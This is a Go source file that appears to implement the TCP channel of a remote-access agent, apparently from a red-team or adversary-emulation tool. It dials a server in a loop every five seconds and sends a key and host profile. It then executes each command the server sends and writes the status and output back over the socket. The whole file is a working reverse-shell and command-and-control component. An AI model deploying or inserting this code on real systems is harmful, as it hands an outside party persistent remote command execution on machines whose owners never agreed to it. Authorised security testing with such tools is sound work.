package sockets

import (
	"bufio"
	"fmt"
	"net"
	"time"
	"strings"
	"strconv"

	"../commands"
	"../output"
)

//TCP communication
type TCP struct {}

func init() {
	CommunicationChannels["tcp"] = TCP{}
}

var shellInfo, paw, httpServer, terminalKey string

//Listen through a new socket connection
func (contact TCP) Listen(key string, port string, server string, profile string) {
	httpServer = server
	shellInfo = profile
	terminalKey = key
	for {
	   conn, err := net.Dial("tcp", port)
	   if err != nil {
		  output.VerbosePrint(fmt.Sprintf("[-] %s", err))
	   } else {
		   paw := handshake(conn)
		   output.VerbosePrint("[+] TCP established")
		   listen(conn, []byte(fmt.Sprintf("%s$", paw)))
	   }
	   time.Sleep(5 * time.Second)
	}
 }

func listen(conn net.Conn, paw []byte) {
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        message := scanner.Text()
        bites, status := commands.RunCommand(strings.TrimSpace(message), httpServer)
        statusBites := []byte(fmt.Sprintf("%s$", strconv.Itoa(status)))
        response := append(paw, statusBites...)
        conn.Write(append(response, bites...))
    }
}

func handshake(conn net.Conn) string {
	//write the profile
    conn.Write([]byte(terminalKey))
    conn.Write([]byte("\n"))
    conn.Write([]byte(shellInfo))
	conn.Write([]byte("\n"))

	//read back the paw
    data := make([]byte, 512)
    n, _ := conn.Read(data)
    paw := string(data[:n])
    conn.Write([]byte("\n"))
    return strings.TrimSpace(string(paw))
}

